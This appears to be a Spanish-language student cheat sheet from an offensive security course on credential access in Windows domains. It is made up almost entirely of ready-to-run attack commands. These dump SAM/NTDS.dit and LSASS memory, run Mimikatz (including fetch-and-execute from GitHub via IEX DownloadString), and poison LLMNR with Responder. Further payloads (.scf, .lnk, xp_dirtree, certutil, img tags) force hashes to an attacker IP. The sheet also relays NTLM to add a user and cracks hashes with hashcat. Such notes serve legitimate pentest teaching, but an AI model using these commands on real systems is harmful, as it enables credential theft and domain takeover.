# 6. Acceso a credenciales
## D1n0 - Alejandro Maman INSO3A U-TAD - 2025/2026

### Tipos de credenciales obtenibles
- Claves en texto claro (archivos)
- Claves en archivos cifrados (SAM / NTDS.dit)
- Hashes y tickets Kerberos en memoria
- Hashes mediante Spoofing local (InternalMonologue)
- Hashes mediante Spoofing en red (Responder)

### SAM / NTDS.dit — Local
```cmd
reg save HKLM\sam SAM
reg save HKLM\system SYSTEM
```
```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```

### SAM / NTDS.dit — Remoto (Impacket)
```bash
impacket-secretsdump <dominio>\<usuario>:<clave>@<IP objetivo>
```
Contra un DC: obtiene hashes de **todos** los usuarios del dominio.

Histórico de contraseñas con NTDSaudit:
```cmd
NtdsAudit.exe ntds.dit --history-hashes -s SYSTEM -p hashes_history.txt
```

### Mimikatz — credenciales en memoria
```cmd
mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > salida.txt
```

Versión PowerShell (sin escritura en disco):
```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

### ProcDump (sin Mimikatz en disco)
```cmd
# Volcar lsass
procdump.exe -accepteula -ma lsass.exe MyDump.dmp
# O desde Administrador de Tareas -> Detalles -> Crear archivo de volcado

# Analizar offline con Mimikatz
mimikatz # sekurlsa::minidump MyDump.dmp
mimikatz # sekurlsa::logonPasswords
```

### InternalMonologue (sin admin)
Fuerza a la máquina a ejecutar acciones de usuarios con procesos activos → obtiene hashes NetNTLM.
```cmd
InternalMonologue.exe
```

### Responder (Spoofing en red)
Envenena LLMNR, NBT-NS, mDNS → captura hashes NetNTLM.
```bash
responder -I eth0 -wrf
```

Con archivo `.scf` en recurso compartido (cualquier usuario que visite el recurso envía su hash):
```ini
[Shell]
Command=2
IconFile=\\<IP atacante>\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

Con archivo `.lnk` (PowerShell):
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut(".\@enlace.lnk")
$lnk.TargetPath = "\\<attackerIP>\@threat.png"
$lnk.Save()
```

### NTLMrelayx
Captura hash y lo reutiliza directamente para acceso y ejecución de comandos:
```bash
impacket-ntlmrelayx -t <IP objetivo> -c '<comando>'
impacket-ntlmrelayx -t 192.168.0.167 -c 'net user NtlmRelay Abc123.. /add'
```

Formas de forzar envío de hashes:
```sql
-- MSSQL
EXEC xp_dirtree '\\<IP atacante>\pwn', 1, 1
```
```cmd
certutil -addstore root \\<IP atacante>\share\certificado.cer
```
```html
<img src="\\<IP atacante>\test.ico" height="1" width="1" />
```

### Password Cracking (Hashcat)
Tipos de hashes: NTLM, NetNTLM, SHA, Kerberos.

```bash
# Wordlist básica
hashcat -a 0 -m 1000 <hashes> /usr/share/wordlists/rockyou.txt -d 1

# Wordlist + reglas
hashcat -a 0 -m 1000 <hashes> dic -d 1 -r rules -r rules2
# Funciones útiles: l (lowercase), u (uppercase), c (capitalize), $X (append), ^X (prepend), sa4 (replace)

# Masks (patrón fijo)
hashcat -a 3 -m 1000 <hashes> -d 1 ?u?l?l?l?l?l?d?d?d?d

# Combinator (parte estática + máscara)
hashcat -a 3 -m 1000 <hashes> -d 1 Rooted?d?d?d?d

# Híbrido (diccionario + máscara)
hashcat -a 6 -m 1000 -d 1 ntlm dic ?d?d?d?d
```

---
